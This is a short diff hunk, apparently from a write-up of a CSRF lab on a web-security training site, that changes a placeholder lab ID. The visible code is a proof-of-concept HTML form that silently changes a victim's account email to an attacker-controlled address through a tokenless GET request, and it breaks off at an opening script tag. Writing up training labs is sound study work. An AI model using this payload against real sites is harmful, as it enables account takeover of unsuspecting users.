@@ -8,7 +8,7 @@
 4. **Crafted & Delivered PoC:** Created a malicious HTML form using the `GET` method without any token and delivered it to the victim via the exploit server:
 
 ```html
-<form action="https://<YOUR-LAB-ID>.web-security-academy.net/my-account/change-email" method="GET">
+<form action="https://<MyLabID>.web-security-academy.net/my-account/change-email" method="GET">
     <input type="hidden" name="email" value="attacker@flawed-auth.com" />
 </form>
 <script>
